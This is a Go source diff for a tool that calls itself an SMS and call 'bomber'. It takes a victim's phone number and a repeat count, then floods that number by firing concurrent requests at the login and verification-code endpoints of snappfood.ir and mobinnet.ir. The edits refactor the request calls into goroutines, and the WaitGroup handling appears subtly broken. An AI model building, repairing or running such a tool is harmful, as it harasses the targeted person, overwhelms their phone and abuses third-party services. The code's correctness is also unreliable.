@@ -29,7 +29,6 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		// استفاده از فرمت خطای smstest.go
 		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
 		ch <- http.StatusInternalServerError
 		return
@@ -37,8 +36,7 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
 	if err != nil {
-		// استفاده از فرمت خطای smstest.go
-		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err) // اضافه کردن URL و خطا برای اطلاعات بیشتر
+		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
 		ch <- http.StatusInternalServerError
 		return
 	}
@@ -46,7 +44,6 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
-		// استفاده از فرمت خطای smstest.go
 		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
 		ch <- http.StatusInternalServerError
 		return
@@ -60,8 +57,7 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
 	if err != nil {
-		// استفاده از فرمت خطای smstest.go
-		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err) // اضافه کردن URL و خطا
+		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err)
 		ch <- http.StatusInternalServerError
 		return
 	}
@@ -69,7 +65,6 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
-		// استفاده از فرمت خطای smstest.go
 		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
 		ch <- http.StatusInternalServerError
 		return
@@ -130,6 +125,7 @@ func main() {
 	// پیام معرفی سرویس‌ها و گرفتن ورودی شماره تلفن و تعداد تکرار (مانند smstest.go)
 	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
+	var phone string // تعریف متغیر phone قبل از استفاده در حلقه
 	fmt.Scan(&phone)
 
 	var repeatCount int
@@ -150,13 +146,21 @@ func main() {
 	ch := make(chan int, repeatCount*2) // Buffer channel to avoid blocking when sending status codes
 
 	for i := 0; i < repeatCount; i++ {
-		// Snappfood form
+		// ارسال مقدار phone به Goroutine با استفاده از تابع بی‌نام
 		wg.Add(1)
-		go sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", url.Values{"cellphone": {phone}}, &wg, ch)
+		go func(p string) {
+			defer wg.Done() // wg.Done باید داخل Goroutine باشد
+			formData := url.Values{}
+			formData.Set("cellphone", p)
+			sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
+		}(phone) // ارسال مقدار phone
 
-		// Mobinnet JSON
+		// ارسال مقدار phone به Goroutine با استفاده از تابع بی‌نام
 		wg.Add(1)
-		go sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch)
+		go func(p string) {
+			defer wg.Done() // wg.Done باید داخل Goroutine باشد
+			sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
+		}(phone) // ارسال مقدار phone
 	}
 
 	// Goroutine to wait for all requests and close the channel
